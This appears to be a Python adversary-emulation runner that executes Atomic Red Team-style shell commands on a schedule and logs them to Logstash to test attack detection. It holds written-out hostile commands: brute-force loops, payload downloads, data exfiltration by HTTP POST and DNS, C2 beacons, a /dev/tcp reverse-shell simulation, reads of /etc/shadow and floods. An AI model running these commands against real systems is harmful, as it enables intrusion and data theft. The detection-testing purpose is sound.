"""
Atomic Red Team runner using atomic-operator.
Downloads atomics from GitHub, executes Linux-compatible tests,
logs output to /tmp/atomic-runner/ for Filebeat pickup.
Also logs structured JSON directly to Logstash UDP.
"""

import os
import json
import time
import socket
import logging
import subprocess
import threading
import random
from datetime import datetime, timezone
from pathlib import Path

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s: %(message)s")
logger = logging.getLogger("atomic-runner")

LOGSTASH_HOST = os.getenv("LOGSTASH_HOST", "logstash")
LOGSTASH_PORT = int(os.getenv("LOGSTASH_PORT", "5000"))
LOG_DIR = Path("/tmp/atomic-runner")
LOG_DIR.mkdir(exist_ok=True)
ATOMICS_DIR = Path("/tmp/atomics")
SCHEDULE_FILE = Path("/app/atomics_schedule.json")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


import logging.handlers

file_logger = logging.getLogger("atomic_file_logger")
file_logger.setLevel(logging.INFO)
file_handler = logging.handlers.RotatingFileHandler(
    LOG_DIR / "atomic_events.log", maxBytes=10*1024*1024, backupCount=3
)
file_handler.setFormatter(logging.Formatter("%(message)s"))
file_logger.addHandler(file_handler)

def _send_log(event: dict):
    """Send structured event to Logstash + write to file for Filebeat."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    event["source"] = "atomic_red_team"
    try:
        sock.sendto((json.dumps(event) + "\n").encode(), (LOGSTASH_HOST, LOGSTASH_PORT))
    except Exception as e:
        logger.warning(f"Logstash send failed: {e}")

    file_logger.info(json.dumps(event))

def _cleanup_remnants():
    """Remove leftover files created by atomics."""
    remnants = [
        "/tmp/payload.bin", "/tmp/tool.sh", "/tmp/decoded", "/tmp/exfil.tar.gz"
    ]
    for r in remnants:
        try:
            p = Path(r)
            if p.exists():
                p.unlink()
        except Exception:
            pass


def download_atomics():
    if ATOMICS_DIR.exists() and list(ATOMICS_DIR.glob("T*")):
        logger.info(f"Atomics already at {ATOMICS_DIR}")
        return True
    logger.info("Downloading Atomic Red Team atomics...")
    try:
        result = subprocess.run(
            ["git", "clone", "--depth=1",
             "https://github.com/redcanaryco/atomic-red-team.git",
             str(ATOMICS_DIR)],
            capture_output=True, text=True, timeout=300
        )
        if result.returncode == 0:
            logger.info("Atomics downloaded")
            return True
        else:
            logger.error(f"Clone failed: {result.stderr[:200]}")
            return False
    except Exception as e:
        logger.error(f"Download error: {e}")
        return False


def run_atomic_technique(technique_id: str, technique_name: str):
    """Execute a technique using subprocess (bash commands from atomic yaml)."""
    logger.info(f"Running: {technique_id} — {technique_name}")

    _send_log({
        "event_type": "atomic_execution_start",
        "mitre_technique": technique_id,
        "technique_name": technique_name,
        "threat_category": "suspicious",
        "alert_level": "high",
    })

    # Map techniques to actual bash commands that generate detectable activity
    commands = _get_commands(technique_id)
    if not commands:
        logger.warning(f"No commands mapped for {technique_id}")
        return

    for cmd_name, cmd in commands:
        try:
            logger.info(f"  Executing: {cmd_name}")
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=30
            )
            is_external = technique_id.split(".")[0] in ("T1041", "T1071", "T1105", "T1059")
            _send_log({
                "event_type": _technique_to_event_type(technique_id),
                "mitre_technique": technique_id,
                "technique_name": technique_name,
                "command": cmd_name,
                "exit_code": result.returncode,
                "stdout_lines": len(result.stdout.splitlines()),
                "threat_category": "attack",
                "alert_level": "critical",
                "src_ip": _get_local_ip(),
                "dst_ip": random.choice(EXTERNAL_IPS) if is_external else f"10.104.4.{random.randint(1,50)}",
                "bytes": _technique_to_bytes(technique_id),
                "dst_port": _technique_to_port(technique_id),
                "src_port": random.randint(1024, 65535),
                "protocol": "tcp",
                "connection_count": _technique_to_connections(technique_id),
            })
            time.sleep(random.uniform(0.5, 2.0))
        except subprocess.TimeoutExpired:
            _send_log({
                "event_type": _technique_to_event_type(technique_id),
                "mitre_technique": technique_id,
                "command": cmd_name,
                "exit_code": -1,
                "error": "timeout",
                "threat_category": "suspicious",
                "alert_level": "medium",
            })
        except Exception as e:
            logger.warning(f"Command error: {e}")

    _send_log({
        "event_type": "atomic_execution_end",
        "mitre_technique": technique_id,
        "technique_name": technique_name,
        "threat_category": "suspicious",
    })
    
    # Cleanup any leftover files created by this technique
    _cleanup_remnants()


def _get_commands(technique_id: str) -> list[tuple[str, str]]:
    """Return list of (name, bash_command) for each technique."""
    base = technique_id.split(".")[0]
    cmds = {
        "T1046": [
            ("nmap_syn_scan", "nmap -sS -p 22,80,443,445,3389 --open 10.104.4.0/24 2>/dev/null | head -20 || true"),
            ("nmap_service_scan", "nmap -sV -p 22,80,443 10.104.4.1 2>/dev/null | head -10 || true"),
        ],
        "T1018": [
            ("arp_discovery", "arp -a 2>/dev/null | head -20 || true"),
            ("ping_sweep", "for i in $(seq 1 10); do ping -c1 -W1 10.104.4.$i > /dev/null 2>&1 && echo 10.104.4.$i; done || true"),
        ],
        "T1049": [
            ("netstat_connections", "netstat -an 2>/dev/null | head -30 || ss -an | head -30 || true"),
            ("list_listening", "ss -tlnp 2>/dev/null | head -20 || true"),
        ],
        "T1057": [
            ("process_list", "ps aux 2>/dev/null | head -30 || true"),
            ("top_processes", "top -bn1 2>/dev/null | head -20 || true"),
        ],
        "T1082": [
            ("system_info", "uname -a && cat /etc/os-release 2>/dev/null | head -5 || true"),
            ("cpu_info", "cat /proc/cpuinfo 2>/dev/null | grep 'model name' | head -3 || true"),
        ],
        "T1083": [
            ("find_sensitive", "find /etc -name '*.conf' -readable 2>/dev/null | head -10 || true"),
            ("list_home", "ls -la /home/ 2>/dev/null || true"),
        ],
        "T1110": [
            ("ssh_brute_root",   "for i in $(seq 1 5); do ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 -o PasswordAuthentication=no root@10.104.4.1 2>/dev/null; done || true"),
            ("ssh_brute_admin",  "for i in $(seq 1 5); do ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 -o PasswordAuthentication=no admin@10.104.4.68 2>/dev/null; done || true"),
            ("ftp_brute",        "for u in root admin ubuntu; do curl -s --max-time 1 ftp://10.104.4.68 --user $u:password 2>/dev/null; done || true"),
        ],
        "T1105": [
            ("tool_download_1",  "curl -sf -o /tmp/payload.bin http://example.com/file 2>/dev/null || curl -sf -o /dev/null http://example.com || true"),
            ("tool_download_2",  "wget -q -O /tmp/tool.sh http://example.com 2>/dev/null || true"),
            ("base64_payload",   "echo 'cGF5bG9hZA==' | base64 -d > /tmp/decoded 2>/dev/null || true"),
        ],
        "T1041": [
            ("exfil_curl",       "dd if=/dev/urandom bs=1024 count=512 2>/dev/null | curl -sf -X POST -d @- http://93.184.216.34/upload 2>/dev/null || true"),
            ("exfil_dns",        "for d in secret1 secret2 secret3 secret4 secret5; do nslookup $d.exfil.example.com 8.8.8.8 2>/dev/null; done || true"),
            ("exfil_archive",    "tar czf /tmp/exfil.tar.gz /etc/passwd /etc/hosts 2>/dev/null && wc -c /tmp/exfil.tar.gz || true"),
        ],
        "T1071": [
            ("c2_http_beacon",   "for i in $(seq 1 8); do curl -sf -A 'Mozilla/5.0' -o /dev/null http://93.184.216.34/beacon?id=$RANDOM 2>/dev/null; sleep 1; done || true"),
            ("c2_https_beacon",  "curl -sf -k -o /dev/null https://93.184.216.34/c2 2>/dev/null || true"),
            ("c2_dns_query",     "for d in beacon cmd update ping; do nslookup $d.c2server.evil 8.8.8.8 2>/dev/null; done || true"),
        ],
        "T1021": [
            ("smb_lateral",      "smbclient -L //10.104.4.1 -N 2>/dev/null || true"),
            ("ssh_lateral",      "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o BatchMode=yes ubuntu@10.104.4.1 id 2>/dev/null || true"),
            ("rdp_probe",        "nmap -sS -p 3389 10.104.4.0/28 2>/dev/null | head -10 || true"),
        ],
        "T1059": [
            ("bash_exec",        "bash -c 'whoami; id; cat /etc/shadow 2>/dev/null | head -3 || echo no-shadow' 2>/dev/null || true"),
            ("python_exec",      "python3 -c 'import os,socket; print(socket.gethostname(), os.getuid())' 2>/dev/null || true"),
            ("reverse_shell_sim","bash -c 'exec 3<>/dev/tcp/93.184.216.34/4444 2>/dev/null; echo connected' 2>/dev/null || true"),
        ],
        "T1068": [
            ("suid_search",      "find / -perm -4000 -type f 2>/dev/null | head -10 || true"),
            ("sudo_check",       "sudo -l 2>/dev/null | head -10 || true"),
            ("capability_check", "getcap -r / 2>/dev/null | head -10 || true"),
        ],
        "T1498": [
            ("syn_flood_sim",    "nmap -sS --min-rate 500 -p 80,443 10.104.4.1 2>/dev/null | head -5 || true"),
            ("icmp_flood_sim",   "ping -c 50 -i 0.05 10.104.4.1 2>/dev/null | tail -3 || true"),
        ],
    }
    return cmds.get(base, [])


def _technique_to_event_type(technique_id: str) -> str:
    mapping = {
        "T1046": "port_scan",
        "T1018": "recon",
        "T1049": "recon",
        "T1057": "recon",
        "T1082": "recon",
        "T1083": "recon",
        "T1110": "brute_force",
        "T1105": "data_exfil",
        "T1041": "data_exfil",
        "T1071": "c2_beacon",
        "T1021": "lateral_movement",
        "T1059": "lateral_movement",
        "T1068": "port_scan",
        "T1498": "port_scan",
    }
    return mapping.get(technique_id.split(".")[0], "recon")


def _technique_to_port(technique_id: str) -> int:
    mapping = {
        "T1046": 0,    "T1018": 0,    "T1049": 0,
        "T1110": 22,   "T1105": 443,  "T1041": 443,
        "T1071": 80,   "T1021": 445,  "T1059": 4444,
        "T1068": 0,    "T1498": 80,
    }
    return mapping.get(technique_id.split(".")[0], 0)


def _technique_to_bytes(technique_id: str) -> int:
    """High byte counts make IsolationForest flag harder."""
    mapping = {
        "T1041": random.randint(500_000, 5_000_000),
        "T1071": random.randint(10_000, 80_000),
        "T1105": random.randint(200_000, 2_000_000),
        "T1110": random.randint(5_000,  50_000),
        "T1046": random.randint(50_000, 300_000),
        "T1021": random.randint(80_000, 800_000),
        "T1059": random.randint(20_000, 200_000),
        "T1498": random.randint(1_000_000, 10_000_000),
    }
    return mapping.get(technique_id.split(".")[0], random.randint(1_000, 10_000))


def _technique_to_connections(technique_id: str) -> int:
    mapping = {
        "T1110": random.randint(50, 500),
        "T1046": random.randint(100, 1000),
        "T1498": random.randint(500, 5000),
        "T1041": random.randint(5, 30),
        "T1071": random.randint(8, 50),
        "T1021": random.randint(10, 100),
    }
    return mapping.get(technique_id.split(".")[0], random.randint(1, 5))


EXTERNAL_IPS = [
    "93.184.216.34", "8.8.8.8", "104.21.12.45", "185.220.101.5",
    "45.33.32.156",  "198.51.100.1", "203.0.113.42", "91.108.4.1",
]


def _get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def scheduler(schedule: list[dict]):
    """Run techniques on their intervals, staggered to avoid bursts."""
    timers: dict[str, float] = {}
    now = time.time()
    # Stagger initial runs
    for i, t in enumerate(schedule):
        timers[t["id"]] = now + i * 15

    while True:
        now = time.time()
        for t in schedule:
            if now >= timers[t["id"]]:
                try:
                    run_atomic_technique(t["id"], t["name"])
                except Exception as e:
                    logger.error(f"Technique {t['id']} error: {e}")
                timers[t["id"]] = now + t["interval_seconds"]
        time.sleep(5)


def main():
    logger.info("Atomic Red Team Runner starting...")

    # Wait for Logstash
    for i in range(30):
        try:
            sock.sendto(b"{}\n", (LOGSTASH_HOST, LOGSTASH_PORT))
            logger.info("Logstash reachable")
            break
        except Exception:
            logger.info(f"Waiting for Logstash {i+1}/30...")
            time.sleep(10)

    # Try to download atomics (optional - we have fallback bash commands)
    download_thread = threading.Thread(target=download_atomics, daemon=True)
    download_thread.start()

    with open(SCHEDULE_FILE) as f:
        schedule = json.load(f)["techniques"]

    logger.info(f"Running {len(schedule)} techniques on schedule")
    _send_log({
        "event_type": "atomic_runner_start",
        "techniques": [t["id"] for t in schedule],
        "threat_category": "normal",
        "alert_level": "low",
    })

    scheduler(schedule)


if __name__ == "__main__":
    main()
